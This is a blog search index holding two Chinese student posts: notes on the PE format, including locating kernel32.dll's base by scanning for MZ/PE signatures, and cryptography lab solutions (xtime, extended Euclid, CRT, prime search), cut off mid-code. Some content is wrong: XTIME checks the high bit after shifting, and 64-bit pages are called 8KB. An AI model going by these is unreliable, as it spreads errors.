<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>逆向工程课程随记</title>
    <link href="/2024/11/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/"/>
    <url>/2024/11/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="关于PE文件（可移植的执行体）"><a href="#关于PE文件（可移植的执行体）" class="headerlink" title="关于PE文件（可移植的执行体）"></a>关于PE文件（可移植的执行体）</h2><blockquote><p>由于一开始的导入图片的图床崩了，后续重新传了一遍图片，但有的图片本地没有了，可能有点乱序和少东西？？？我现在没有发现哪儿少啥了<del>懒得再改了:dog:</del></p><p><del>已经弄了好几遍了,弄了好久，好累，有谁发现哪儿对不上或者少啥戳一下我，主要内容是顺着老师的ppt捋的</del></p></blockquote><ul><li><p>dll文件、exe文件都属于pe文件</p></li><li><p>虚拟地址中，32位的一页为4kB(0x1000)，64位的为8kb(0x2000)</p></li><li><p>物理扇区以512字节（0x200）为一个单位对齐，因此PE文件在内存中的尺寸要比文件大。</p></li><li><p>pe文件有固定的开始特征，MZ头与PE头<br>总体PE结构</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261606036.png" alt="image-20241124184342102"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261607830.png" alt="image-20241126160750732"></p></li></ul><h3 id="DOS头剩余的作用"><a href="#DOS头剩余的作用" class="headerlink" title="DOS头剩余的作用"></a>DOS头剩余的作用</h3><ul><li>在0x3c（地址固定）的位置处有一个B0,这个位置记录了PE头的偏移位置。</li></ul><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261605231.png" alt="image-20241124183941912"></p><h3 id="PE头标识以及标准PE头"><a href="#PE头标识以及标准PE头" class="headerlink" title="PE头标识以及标准PE头"></a>PE头标识以及标准PE头</h3><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261610652.png" alt="image-20241126161034551"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261613676.png" alt="image-20241124190256491"></p><ul><li>PE文件中自定义节的数量，在节表来描述节的信息，每个节的描述信息都固定40个字节。</li><li>标志集合如果为0x2000就是dll（这是从网上搜到有人回复的，但是存疑）（网上是对的标志位）</li></ul><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261612919.png" alt="image-20241124185228367"></p><p>这是询问的gpt关于这个标志集合的解释（gpt有误，还好去问了问官方文档，下面这个是错的哦）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412021546367.png" alt="image-20241202154606214"></p><p>官方文档给出的表格：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412021552705.png" alt="image-20241202155211599"></p><p>这是一个dll文件对应的标志（？？？？？）<br><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412021546710.png" alt="image-20241202154647636"></p><p>问了老师。。。小端序去读：0x210e</p><p>老师建议用pe editor去看</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412021626763.png" alt="image-20241202162152492"></p><p>pe文件可能的类型：</p><p>在 PE 文件格式中，根据用途和特性，主要可以分为以下几种类型：</p><hr><ol><li><strong>可执行文件（Executable, EXE）</strong></li></ol><ul><li>特点：<ul><li>包含程序入口点（Entry Point）。</li><li>可直接加载到内存中由操作系统运行。</li><li>通过链接器将目标文件链接生成。</li></ul></li><li><strong>典型扩展名</strong>：<code>.exe</code></li><li>用途：<ul><li>普通的 Windows 应用程序。</li></ul></li></ul><hr><ol start="2"><li><strong>动态链接库（Dynamic Link Library, DLL）</strong></li></ol><ul><li>特点：<ul><li>没有程序入口点，不能独立执行。</li><li>提供函数和资源供其他程序调用。</li><li>支持多进程共享代码和数据。</li></ul></li><li><strong>典型扩展名</strong>：<code>.dll</code></li><li>用途：<ul><li>系统和应用程序的共享库（如 <code>kernel32.dll</code>, <code>user32.dll</code>）。</li></ul></li></ul><hr><ol start="3"><li><strong>系统文件（System File, SYS）</strong></li></ol><ul><li>特点：<ul><li>用于操作系统的内核模式。</li><li>通常是设备驱动程序或系统服务的实现。</li><li>加载时需要内核的帮助。</li></ul></li><li><strong>典型扩展名</strong>：<code>.sys</code></li><li>用途：<ul><li>Windows 内核模块或驱动程序。</li></ul></li></ul><hr><ol start="4"><li><strong>对象文件（Object File, OBJ）</strong></li></ol><ul><li>特点：<ul><li>是编译器生成的中间文件。</li><li>由链接器处理后生成最终的可执行文件或库。</li><li>包含代码和数据的片段以及重定位信息。</li></ul></li><li><strong>典型扩展名</strong>：<code>.obj</code></li><li>用途：<ul><li>静态库或最终程序的构建过程。</li></ul></li></ul><hr><ol start="5"><li><strong>静态库（Static Library, LIB）</strong></li></ol><ul><li>特点：<ul><li>包含多个目标文件的集合。</li><li>链接到最终的可执行文件中。</li><li>不需要在运行时单独加载。</li></ul></li><li><strong>典型扩展名</strong>：<code>.lib</code></li><li>用途：<ul><li>提供代码重用功能的静态模块。</li></ul></li></ul><hr><ol start="6"><li><strong>引导程序文件（Boot File）</strong></li></ol><ul><li>特点：<ul><li>用于操作系统引导阶段。</li><li>一些特定情况下被解释为 PE 文件。</li></ul></li><li><strong>典型扩展名</strong>：无固定扩展名（如 <code>bootmgr</code>）。</li><li>用途：<ul><li>系统启动相关。</li></ul></li></ul><hr><p>这些类型文件的基础格式是相同的，但具体的标志、段结构和用途有所不同。了解这些类型有助于分析不同的 PE 文件及其作用。</p><p>这个文件有5个节，如下：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261612671.png" alt="image-20241124185419557"></p><h3 id="扩展PE头"><a href="#扩展PE头" class="headerlink" title="扩展PE头"></a>扩展PE头</h3><p>总体结构：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261602388.png" alt="image-20241124191408697"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261601122.png" alt="image-20241124191427964"></p><p>数据示例：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261602003.png" alt="image-20241124191023141"></p><p>红框再往后，0x00001000,0x00000200，分别代表在内存和文件的对齐方式（对应32位）</p><p>PE扩展头的最后一个字段是16个元素的数组，里面定义了PE文件中各种数据的目录信息，如导出表、导入表、资源等16种。</p><h3 id="节表（每一节40字节，0x28）"><a href="#节表（每一节40字节，0x28）" class="headerlink" title="节表（每一节40字节，0x28）"></a>节表（每一节40字节，0x28）</h3><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261600588.png" alt="image-20241124192304406"></p><p>如这里是text节表</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261558649.png" alt="image-20241124192944192"></p><p>0x1092代表实际字节数，0x1000是RVA，0x1200是对齐后的尺寸，0x0400是原始数据在文件中的数据，也就是最下面的红框。</p><h3 id="寻找kernel-32-dll的基地址"><a href="#寻找kernel-32-dll的基地址" class="headerlink" title="寻找kernel.32.dll的基地址"></a>寻找kernel.32.dll的基地址</h3><ol><li><p>去除低两个字节的值，只保留高两个字节的高位地址，windows中32位程序的入口地址通常应该通常以7000 0000 H开始。如同linux中可执行文件，64位以7f开头，32位以ff开头。</p></li><li><p>不断寻找MZ与PE标志，如果找到MZ标志，就将它对应的地址+0x3c，把里面对应的地址加载到找到MZ时的基地址中，比对是否为PE，如果是，则代表这是真正的入口地址。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261557350.png" alt="image-20241124193742932"></p><p>总程序</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261556685.png" alt="image-20241124202458642"></p><p>jb代表进位或借位信号</p><p>大于的话，CF标志（借位）为0，不会进行跳转。</p><p>流程图（这是老师留的作业，不理解的自己跟着画一遍，别直接截走)：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411261623966.png" alt="image-20241124202241012"></p></li></ol><h3 id="关于导入表"><a href="#关于导入表" class="headerlink" title="关于导入表"></a>关于导入表</h3><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411271159298.png" alt="image-20241127115909912"></p><p> PE位置+0x78是16个表项的序列信息。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411271345541.png" alt="image-20241127134544447"></p><blockquote><p><strong>该字段定义了</strong> <strong>PE</strong> <strong>文件中出现的所有不同类型的数据的目录信息。如导出表、导入表、资源等。</strong> <strong>16种</strong></p><p>8个字节记录一个目录，0x00002010是虚拟偏移，0x0000003c（60）是长度</p></blockquote><ul><li>该偏移位于.rdata段，物理对应的起始为0x600,文件中的导入表就是0x610位置</li></ul><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411271357103.png" alt="image-20241127135747068"></p><ul><li>每个导入表的表项有0x14字节（20字节），这里涉及到了两个导入的函数，2个表项，40字节，<u><em><strong>但是需要最后一个表项用全0表示终止，所以总共用了3个表项，60字节。</strong></em></u></li></ul><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411271401394.png" alt="image-20241127140106324"></p><p>以下分别是桥1，指向链接库的指针，桥2</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411271404208.png" alt="image-20241127140420154"></p><p>桥一虚拟偏移2008，文件偏移608</p><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412041116466.png" alt="image-20241204111650355"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412041104805.png" alt="image-20241204110407587"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202412041110986.png" alt="image-20241204111019820"></p><p>节对应rva2000-&gt;foa800</p><blockquote><p>nName 94c-&gt;2190—-990-&gt; “winresult.dll”</p><p>nBase  950-&gt;01(这是起始序号，函数编号-起始序号就是索引号)</p><p>Address of functions 95c-&gt;2168—-968 -&gt;数组（1083、1022逐个的RVA偏移）</p><p>Address of Names    960-&gt;2178—-978 -&gt;数组（219E（99E-&gt;函数名字）、21AB）（对应相加）</p><p>Address of NameOrdinals 964-&gt;2188—988-&gt;数组（0000、0001、0002、0003）（这是索引号）</p><p>也可以得知函数序号分别为1、2、3、4.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>re</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用密码学实验笔记</title>
    <link href="/2024/11/20/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/11/20/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="应用密码学实验笔记"><a href="#应用密码学实验笔记" class="headerlink" title="应用密码学实验笔记"></a>应用密码学实验笔记</h1><h2 id="密码学数学基础"><a href="#密码学数学基础" class="headerlink" title="密码学数学基础"></a>密码学数学基础</h2><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><h3 id="有限域运算"><a href="#有限域运算" class="headerlink" title="有限域运算"></a>有限域运算</h3><ol><li><p>关于x-time的计算（有限域为GF($2^8$)）：</p><ul><li>在AES 算法中定义 m(x) 多项式（不可约多项式）为： m(x)&#x3D;<code>x8+x4+x3+x+1</code>(十六进制的11B)</li></ul><p>x-time(x)就是计算x&lt;&lt;1(相当于乘2)，<u>如果移位前的最高位为1，就让移位后x取模m(x)</u>一定要注意顺序。</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title">XTIME</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> x)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//*******************Begin*******************</span><br>    x &lt;&lt;= <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(x &amp; <span class="hljs-number">0x80</span>) x ^= <span class="hljs-number">0x1b</span>;<br>    <span class="hljs-keyword">return</span> x;<br><span class="hljs-comment">//*********************End********************</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%x&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>,<span class="hljs-built_in">XTIME</span>(a));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol start="2"><li>有限域的乘法计算</li></ol><h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><blockquote><p>贝祖等式：$s \cdot a + t \cdot b &#x3D; (a,b)$；其中（a,b）为a、b的最大公因数。利用扩展欧几里得算法，根据贝祖等式，可以求乘法逆元。</p></blockquote><blockquote><p>一般用较大的数作为模</p></blockquote><p>前提:</p><ul><li><p>a、b互素才有乘法逆元</p></li><li><p>把大的那一方当作b，当作模数，最终的s即为所求（个人理解）</p><p>下图是一个手写的示例</p><p>若从a&#x3D;121,b&#x3D;169开始，最上面补一步</p><p>（左侧为a，右侧的除数为b）</p><p>依次a1、b1</p><p>121 &#x3D; 0 * 169 + 121</p></li></ul><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202411042117617.png" alt="手写图"></p><p>169 mod 121的乘法逆元即为58。</p><p>$gcd(a,b)&#x3D;sa+tb$</p><p>$gcd(a,b)&#x3D;gcd(b,a%b)$是子式之间的关系</p><p>$sa+tb&#x3D;s_1b+t_1(a-a&#x2F;&#x2F;b*b)$</p><p>即$a_1&#x3D;b,b_1&#x3D;a-a&#x2F;&#x2F;b$依次可以继续递推，直到欧几里得的倒数第二步（也就是图中的最后1步）</p><p>再下一步是1 &#x3D; 0*0+1</p><p>$a_n&#x3D;b_{n-1}&#x3D;1,b_n&#x3D;0$</p><p>则s&#x3D;1,t&#x3D;0</p><p>它的上一步的值就得知了。</p><p>并且由$sa+tb&#x3D;s_1b+t_1(a-a&#x2F;&#x2F;b*b)$化简得</p><p>$sa+tb &#x3D; s_1b+t_1a-t1(a&#x2F;&#x2F;b*b)$</p><p>则$s&#x3D;t1,t&#x3D;s1-t1(a&#x2F;&#x2F;b)$</p><p>下列代码以b为较大的数，mod b，则最终的s即为所求</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">def gcd(a, b):<br><span class="hljs-code">    # *************begin************#</span><br><span class="hljs-code"></span><br><span class="hljs-code">    r = a % b</span><br><span class="hljs-code">    while r:</span><br><span class="hljs-code">        a = b</span><br><span class="hljs-code">        b = r</span><br><span class="hljs-code">        r = a % b</span><br><span class="hljs-code">    return b</span><br><span class="hljs-code"></span><br><br><span class="hljs-section"># <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**end**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**<span class="hljs-emphasis">*#</span></span></span><br><span class="hljs-emphasis"><span class="hljs-strong"><span class="hljs-section">def extendGcd(a, b):</span></span></span><br><span class="hljs-emphasis"><span class="hljs-strong"><span class="hljs-section">#*</span>**</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>Begin<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**</span><br><span class="hljs-code">    if b == 0:</span><br><span class="hljs-code">        return (1, 0)</span><br><span class="hljs-code">    s1 , t1 = extendGcd(b,a % b)</span><br><span class="hljs-code">    s = t1</span><br><span class="hljs-code">    t = s1 - t1 * (a // b)</span><br><span class="hljs-code">    return s,t</span><br><span class="hljs-code"></span><br><br><span class="hljs-section">#<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-emphasis">*End<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>*</span>*</span><br><br>def main():<br><span class="hljs-code">    a = int(input())</span><br><span class="hljs-code">    b = int(input())</span><br><span class="hljs-code">    if a &gt; b:</span><br><span class="hljs-code">        temp = a</span><br><span class="hljs-code">        a = b</span><br><span class="hljs-code">        b = temp</span><br><span class="hljs-code">    if gcd(a, b)==1:</span><br><span class="hljs-code">        r = extendGcd(a, b)[0]%b</span><br><span class="hljs-code">    else:</span><br><span class="hljs-code">        r = None</span><br><span class="hljs-code">    print(r)</span><br><span class="hljs-code"></span><br><br>if <span class="hljs-strong">__name__</span> == &#x27;<span class="hljs-strong">__main__</span>&#x27;:<br><span class="hljs-code">    main()</span><br></code></pre></td></tr></table></figure><p>c++实现（其实是用c，但是&amp;的引用c不支持，c++才支持）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">exEuclid</span><span class="hljs-params">(<span class="hljs-type">long</span> a,<span class="hljs-type">long</span> b,<span class="hljs-type">long</span> &amp;x,<span class="hljs-type">long</span> &amp;y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/***********************Begin**************************/</span><br><span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>)<br>&#123;<br>x = <span class="hljs-number">1</span>;<br>y = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">long</span> gcd = <span class="hljs-built_in">exEuclid</span>(b, a % b, x, y);<br><span class="hljs-type">long</span> temp;<br>temp = x;<br>x = y;<br>y = temp - y * (a / b);<br><span class="hljs-keyword">return</span> gcd;<br><span class="hljs-comment">/*************************End**************************/</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-type">long</span> a, b, x, y = <span class="hljs-number">0</span>, t;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ld %ld&quot;</span>, &amp;a, &amp;b);  <span class="hljs-comment">//测试集输入a、b，要求exEuclid函数的输出与a、b输入的顺序无关</span><br><span class="hljs-keyword">if</span> (a &gt; b) &#123;<br>t = a;<br>a = b;<br>b = t;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld %ld %ld&quot;</span>, x, y, <span class="hljs-built_in">exEuclid</span>(a, b, x, y));<br><span class="hljs-comment">//使得函数exEuclid返回gcd(a,b),依次输出x、y、gcd，使得等式a*x+b*y=gcd(a,b)</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>按照公式计算即可。</p><p>$m&#x3D;m_1\cdots m_k,\quad m&#x3D;m_i\cdot M_i,\quad i&#x3D;1,\cdots,k,$</p><p>$M_i^{\prime}\cdot M_i\equiv1\pmod{m_i}, i&#x3D;1,2,\cdots,k.$</p><p>$x\equiv b_1\cdot M_1^{\prime}\cdot M_1+b_2\cdot M_2^{\prime}\cdot M_2+\cdots+b_k\cdot M_k^{\prime}\cdot M_k\pmod{m}$</p><p>其中，M_list分别对应各个M，M_n_list对应M的逆的列表。（题中ei_list对应M的逆，这里回顾一下列表生成式的使用）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Get_Mi</span>(<span class="hljs-params">m_list,M</span>):<br>    M_list=[]<br>    <span class="hljs-keyword">for</span> mi <span class="hljs-keyword">in</span> m_list:<br>        M_list.append(M//mi)<br>    <span class="hljs-keyword">return</span> M_list<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Get_ei_list</span>(<span class="hljs-params">M_list,m_list</span>):<br>    ei_list=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(M_list)):<br>        ei_list.append(Get_ei(M_list[i],m_list[i])[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> ei_list<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Get_ei</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-comment"># 计算ei，猜测为求M的逆元</span><br>    <span class="hljs-comment">#        请在此处添加代码       #</span><br>    <span class="hljs-comment"># *************begin************#</span><br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>    s1 , t1 = Get_ei(b,a % b)<br>    s = t1<br>    t = s1 - t1 * (a // b)<br>    <span class="hljs-keyword">return</span> s,t<br><br>    <span class="hljs-comment"># **************end*************#</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crt</span>(<span class="hljs-params">a_list, m_list</span>):<br>    <span class="hljs-comment"># 计算中国剩余定理，返回计算结果</span><br>    <span class="hljs-comment">#        请在此处添加代码       #</span><br>    <span class="hljs-comment"># *************begin************#</span><br>    m = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m_list:<br>        m *= i<br>    M_list = Get_Mi(m_list, m)<br>    <span class="hljs-comment"># ei_list = Get_ei_list(M_list, m_list)</span><br>    M_n_list = [Get_ei(a,b)[<span class="hljs-number">0</span>]%b <span class="hljs-keyword">for</span> a ,b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(M_list,m_list)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>([b*M*M_n <span class="hljs-keyword">for</span> b,M,M_n <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a_list,M_list,M_n_list)])% m<br><br><br><br><span class="hljs-comment"># **************end*************#</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    a_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    m_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    <span class="hljs-built_in">print</span>(crt(a_list, m_list))<br><br></code></pre></td></tr></table></figure><h3 id="并发大素数计算"><a href="#并发大素数计算" class="headerlink" title="并发大素数计算"></a>并发大素数计算</h3><p>由于限制了运行时间，注意尽可能减少素数的判断，将偶数除去，并且获取CPU最大核心数作为并发数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ProcessPoolExecutor<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">if</span> num &lt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> num == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">int</span>(math.sqrt(num)) + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">if</span> num % i == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    results = []<br>    max_workers = os.cpu_count()  <span class="hljs-comment"># 获取 CPU 